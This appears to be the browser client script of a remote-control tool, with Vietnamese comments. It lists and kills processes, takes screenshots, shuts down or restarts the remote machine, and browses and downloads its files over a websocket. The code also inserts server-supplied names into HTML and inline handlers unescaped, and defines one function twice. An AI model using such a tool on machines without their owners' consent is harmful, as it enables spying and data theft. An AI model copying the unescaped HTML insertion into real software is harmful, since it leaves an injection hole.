                ramDisplay = `<span style="color:#cbd5e1; font-style:italic;">N/A</span>`;
            } else {
                ramDisplay = `<span style="color:#60a5fa;">${ramRaw.toFixed(1)} MB</span>`;
            }

            const tr = document.createElement("tr");

            // Render HTML: Khớp với thứ tự Header (PID | Name | Threads | RAM | Action)
            tr.innerHTML = `
                <td><strong>${pid}</strong></td>
                <td>${name}</td>
                <td>${threads}</td>
                <td>${ramDisplay}</td>
                <td style="text-align: center;">
                    <button class="btn-icon-small" onclick="handleProcessAction('kill', '${pid}')" title="End Process">
                        <i data-lucide="x-circle" style="color: #fb7185;"></i>
                    </button>
                </td>
            `;
            tb.appendChild(tr);
        }
    });

    // Kích hoạt lại icon Lucide cho các nút mới thêm
    if (typeof lucide !== 'undefined') lucide.createIcons();
}
function requestScreenshot() { sendCmd("screenshot"); }

function confirmPower(action) {
    const msg = action === 'shutdown' ? "Are you sure you want to SHUTDOWN the remote computer?" : "Are you sure you want to RESTART the remote computer?";
    if(confirm(msg)) sendCmd(action);
}

/* --- FILE TRANSFER FUNCTIONS --- */

function requestDownloadFile() {
    const path = document.getElementById("filePathInput").value.trim();
    if (!path) {
        showToast("Please enter remote file path", "error");
        return;
    }
    sendCmd("download-file " + path);
    
    addActivityLog("Requesting file: " + path);
    const btn = document.querySelector("#tab-files button");
    if(btn) {
        const originalText = btn.innerHTML;
        btn.innerHTML = `<i data-lucide="loader" class="spinning"></i> Downloading...`;
        btn.disabled = true;
        setTimeout(() => {
            btn.innerHTML = originalText;
            btn.disabled = false;
            if(typeof lucide !== 'undefined') lucide.createIcons();
        }, 2000);
    }
}

function saveBase64ToDisk(filename, base64) {
    try {
        const cleanBase64 = base64.replace(/[^A-Za-z0-9+/=]/g, "");

        const binaryString = atob(cleanBase64);
        const len = binaryString.length;
        const bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binaryString.charCodeAt(i);
        }

        const blob = new Blob([bytes], { type: "application/octet-stream" });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = filename;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        // --- XỬ LÝ GIAO DIỆN LỊCH SỬ ---
        const list = document.getElementById("file-download-list");
        if (list) {
            if (list.querySelector(".scan-placeholder")) list.innerHTML = "";

            // Xử lý đường dẫn From:
            let sourcePathDisplay = "Unknown source";
            if (currentRemotePath) {
                sourcePathDisplay = currentRemotePath.endsWith("\\") || currentRemotePath === "MyComputer" 
                    ? currentRemotePath + filename 
                    : currentRemotePath + "\\" + filename;
            }

            // Xử lý đường dẫn To: (Giả lập thư mục Downloads)
            const destPathDisplay = "Downloads\\" + filename;

            const item = document.createElement("div");
            item.className = "file-item";
            
            // Cập nhật HTML để hiển thị cả From và To
            item.innerHTML = `
                <div class="file-info" style="overflow: hidden;">
                    <div class="file-icon-box"><i data-lucide="file-check"></i></div>
                    <div style="min-width: 0;">
                        <div class="file-name" style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${filename}</div>
                        <div class="file-path">${(bytes.length / 1024).toFixed(1)} KB • ${new Date().toLocaleTimeString()}</div>
                        
                        <div class="file-path-source" title="${sourcePathDisplay}">From: ${sourcePathDisplay}</div>
                        
                        <div class="file-path-source" style="color: #3b82f6;" title="Saved to Browser Downloads">To: ${destPathDisplay}</div>
                    </div>
                </div>
                <div class="badge-success">Saved</div>
            `;
            list.prepend(item);
            if(typeof lucide !== 'undefined') lucide.createIcons();
        }
        
        return true; 

    } catch (e) {
        console.error("File Save Error:", e);
        showToast("Error saving file (Invalid Base64)", "error");
        return false; 
    }
}
// ======================================================
// CÁC HÀM HỖ TRỢ FILE MANAGER (Dán vào cuối client.js)
// ======================================================

let currentRemotePath = "MyComputer"; // Mặc định hiển thị danh sách ổ đĩa trước // Biến lưu đường dẫn hiện tại

// 1. Gửi lệnh yêu cầu danh sách file
function requestListDirectory(path) {
    if (!websocket || websocket.readyState !== WebSocket.OPEN) return;
    
    // Nếu path rỗng thì mặc định là ổ C
    if (!path) path = "MyComputer";
    
    // Gửi lệnh "ls <path>" sang Server
    websocket.send("ls " + path);

    // Hiện thông báo đang tải
    const listContainer = document.getElementById("file-browser-list");
    if(listContainer) {
        listContainer.innerHTML = '<div style="padding:20px; text-align:center; color:#666">Loading...</div>';
    }
}

// 2. Hàm vẽ giao diện khi nhận được DIR_LIST từ Server
// Hàm vẽ giao diện khi nhận được DIR_LIST từ Server
function renderFileBrowser(data) {
    const lines = data.split("\n");
    
    // Dòng 2 chứa đường dẫn hiện tại do Server gửi về
    if (lines.length > 1) {
        const serverPath = lines[1].trim();
        currentRemotePath = serverPath;
        const pathInput = document.getElementById("currentPath");
        if (pathInput) pathInput.value = serverPath;
    }

    const listContainer = document.getElementById("file-browser-list");
    if (!listContainer) return;

    listContainer.innerHTML = ""; // Xóa danh sách cũ

    // Duyệt từ dòng 3 trở đi (bỏ qua Header và Path)
    for (let i = 2; i < lines.length; i++) {
        const line = lines[i].trim();
        if (!line) continue;

        const parts = line.split("|"); // Tách chuỗi bằng dấu |
        const type = parts[0]; // [DRIVE], [DIR] hoặc [FILE]
        const name = parts[1];
        
        const itemDiv = document.createElement("div");
        // Style inline đơn giản để đảm bảo đẹp ngay lập tức
        itemDiv.style.cssText = "display:flex; justify-content:space-between; padding:8px; border-bottom:1px solid rgba(0,0,0,0.1); align-items:center;";
        itemDiv.className = "browser-item"; // Class để CSS (nếu có)

        if (type === "[DRIVE]") {
             // --- [MỚI] Ổ ĐĨA (C:\, D:\...) ---
             // Xử lý escape dấu \ để truyền vào hàm JS an toàn
             const safeDrivePath = name.replace(/\\/g, "\\\\");

             itemDiv.innerHTML = `
                <div style="cursor:pointer; display:flex; align-items:center; gap:10px; flex:1;" onclick="requestListDirectory('${safeDrivePath}')">
                    <i data-lucide="hard-drive" style="color:#2563eb; fill:#dbeafe; width:20px;"></i>
                    <span style="font-weight:bold;">${name} (Local Disk)</span>
                </div>
            `;
        }
        else if (type === "[DIR]") {
            // --- THƯ MỤC ---
            // Tạo đường dẫn mới an toàn (thêm dấu \\)
            const newPath = (currentRemotePath + name + "\\").replace(/\\/g, "\\\\");
            
            itemDiv.innerHTML = `
                <div style="cursor:pointer; display:flex; align-items:center; gap:10px; flex:1;" onclick="requestListDirectory('${newPath}')">
                    <i data-lucide="folder" style="color:#d97706; fill:#fbbf24; width:20px;"></i>
                    <span style="font-weight:500;">${name}</span>
                </div>
                <button class="btn-mini" onclick="copyPath('${newPath}')" style="font-size:0.7rem; padding:2px 5px;">Copy</button>
            `;
        } else {
            // --- FILE ---
            const size = parts[2] || "0 KB";
            // Escape đường dẫn để truyền vào hàm JS
            const fullPath = (currentRemotePath + name).replace(/\\/g, "\\\\");
            
            itemDiv.innerHTML = `
                <div style="display:flex; align-items:center; gap:10px; flex:1;">
                    <i data-lucide="file" style="color:#475569; width:20px;"></i>
                    <span>${name}</span>
                    <span style="font-size:0.75rem; color:#94a3b8; margin-left:10px;">(${size})</span>
                </div>
                <div style="display:flex; gap:5px;">
                    <button class="btn-mini" onclick="downloadSingleFile('${fullPath}')" style="background:#dbeafe; color:#2563eb; border:none; padding:4px 8px; border-radius:4px; cursor:pointer;">
                        <i data-lucide="download" style="width:14px;"></i>
                    </button>
                </div>
            `;
        }
        listContainer.appendChild(itemDiv);
    }
    
    // Tạo lại icon Lucide (nếu thư viện đã load)
    if(typeof lucide !== 'undefined') lucide.createIcons();
}

// 3. Các nút điều hướng
function refreshDir() {
    const pathInput = document.getElementById("currentPath");
    if (pathInput) requestListDirectory(pathInput.value);
}

function navigateUp() {
    let path = currentRemotePath;
    
    // Nếu đang ở MyComputer rồi thì thôi
    if (path === "MyComputer") return;

    // Nếu đang ở gốc ổ đĩa (VD: "C:\" hoặc "D:\") -> Về danh sách ổ
    if (/^[A-Z]:\\$/.test(path)) {
        requestListDirectory("MyComputer");
        return;
    }

    // Logic cũ: Cắt bớt đường dẫn
    if (path.endsWith("\\")) path = path.slice(0, -1);
    const lastSlash = path.lastIndexOf("\\");
    
    if (lastSlash !== -1) {
        path = path.substring(0, lastSlash + 1);
        requestListDirectory(path);
    } else {
        // Fallback an toàn
        requestListDirectory("MyComputer");
    }
}

// 4. Xử lý tải file
// Tìm hàm này ở cuối file client.js
function downloadSingleFile(fullPath) {
    if (!websocket) return;
    
    // --- SỬA DÒNG NÀY ---
    // Cũ: websocket.send("download " + fullPath);
    // Mới: Phải thêm "-file" vào để khớp với main.cpp
    websocket.send("download-file " + fullPath); 
    
    // Có thể thêm toast thông báo ở đây
    console.log("Requesting: " + fullPath);
    showToast("Requesting download..."); // Thêm thông báo cho trực quan
}

// Hàm cho nút Manual Download (Nhập tay)
function requestDownloadFile() {
    const input = document.getElementById("filePathInput");
    if (input && input.value) {
        downloadSingleFile(input.value);
    } else {
        alert("Please enter a file path!");
    }
}

// 5. Hàm lưu file Base64 xuống máy (Core)
function saveBase64File(base64, filename) {
    try {
        const binaryString = atob(base64);
        const len = binaryString.length;
        const bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binaryString.charCodeAt(i);
        }
        const blob = new Blob([bytes], { type: "application/octet-stream" });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = filename;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        // Thêm vào lịch sử tải xuống
        const historyList = document.getElementById("file-download-list");
        if (historyList) {
            const item = document.createElement("div");
            item.style.cssText = "padding:5px; border-bottom:1px solid #eee; display:flex; align-items:center; gap:5px; font-size:0.85rem;";
            item.innerHTML = `<i data-lucide="check" style="width:14px; color:green"></i> <span>${filename}</span>`;
            historyList.prepend(item);
            if(typeof lucide !== 'undefined') lucide.createIcons();
        }
    } catch (e) {
        console.error("Save file error:", e);
        alert("Error saving file. Base64 format might be invalid.");
    }
}

// 6. Tiện ích copy
function copyPath(text) {
    navigator.clipboard.writeText(text);
}